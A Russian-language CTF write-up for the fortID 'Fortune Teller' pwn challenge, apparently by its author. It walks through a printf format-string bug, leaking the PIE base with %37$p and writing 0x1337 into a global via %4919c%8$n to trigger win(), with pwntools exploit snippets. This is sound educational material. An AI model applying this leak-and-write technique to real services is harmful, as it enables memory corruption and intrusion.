# Fortune Teller — fortID CTF (format string → PIE leak → %n)

Oct 11, 2026 · @Demian

## Условие

Pwn-таск fortID. Дан бинарь `fortune` и исходник `chall.c`. «Оракул ответит на любой вопрос, но может сказать лишнего». Нужно подключиться к сервису и забрать флаг.

Защиты — по максимуму: **Full RELRO, stack canary, NX, PIE**. Значит классические трюки (перезапись GOT, ret2win по фиксированному адресу, шеллкод на стеке) не проходят, а все адреса образа — рандомизированы.

## Уязвимость

Меню из трёх пунктов. Весь баг — в пункте 1 (`ask_oracle`):

```c
read_line(question, sizeof(question));
puts("The oracle speaks:");
printf(question);          // <-- format string: наш ввод как формат-строка
putchar('\n');
```

`printf(question)` печатает пользовательский ввод напрямую → классический **format string**. Это даёт и чтение стека (`%p`), и запись в произвольный адрес (`%n`).

Цель видна в `chall.c`: функция `win()` печатает `flag.txt`, а вызывается она из `receive_blessing()` только при условии

```c
if (blessing == 0x1337) { ...; win(); }
```

`blessing` — глобальная `volatile unsigned int`. Значит план: через `%n` записать `0x1337` в `blessing`, затем выбрать пункт 2.

## Препятствие: PIE

`blessing` — глобал, его адрес = `PIE_base + смещение_символа`. База рандомизируется при каждом запуске, поэтому записать по фиксированному адресу нельзя — сначала **нужна утечка базы**. Делаем всё в одном соединении: сперва сливаем адрес, потом пишем.

## Этап 1 — утечка PIE base

Форматной строкой `%37$p` достаём с 37-го слота стека указатель внутрь образа. Опытным путём это оказался `base + 0x1441`, откуда:

```python
base     = leak - 0x1441
blessing = base + exe.sym["blessing"]   # смещение символа берём из ELF
```

## Этап 2 — запись 0x1337 в blessing

Наш буфер `question` начинается со слота `%6$` на стеке. Форматная спека занимает слоты 6–7 (16 байт), а сам адрес кладём в слот 8 — на него и указываем `%8$n`:

```python
spec    = (b"%%%dc%%%d$n" % (0x1337, 8)).ljust(16, b"A")  # %4919c%8$n
payload = spec + p64(blessing)
```

`%4919c` печатает 4919 (= `0x1337`) символов, после чего `%n` записывает это число в 4-байтовый `blessing`. Full RELRO тут не мешает — мы пишем в `.bss`-переменную, а не в GOT.

## Этап 3 — забрать флаг

Выбираем пункт 2 (`Receive blessing`): условие `blessing == 0x1337` выполнено → `win()` печатает содержимое `flag.txt`.

## Эксплойт

Полный скрипт — [`exploit.py`](./exploit.py), исходник — [`chall.c`](./chall.c). Удалённо работает в один заход процесса (иначе после рестарта PIE-база меняется и утечка протухает):

```python
io = remote("fortune-teller-...inst15.ctf.fortid.com", 1337, ssl=True)
ask(b"%37$p")                       # утечка
# ... вычисляем base, blessing ...
ask(spec + p64(blessing))           # запись 0x1337
io.sendline(b"2")                   # receive_blessing -> win() -> флаг
```

## Итог

Format string при всех включённых мерах защиты всё равно даёт и чтение (обход PIE), и запись (`%n` в глобал). Канарейка и Full RELRO не спасают, потому что мы не трогаем ни адрес возврата, ни GOT — только обычную переменную, от которой зависит вызов `win()`.
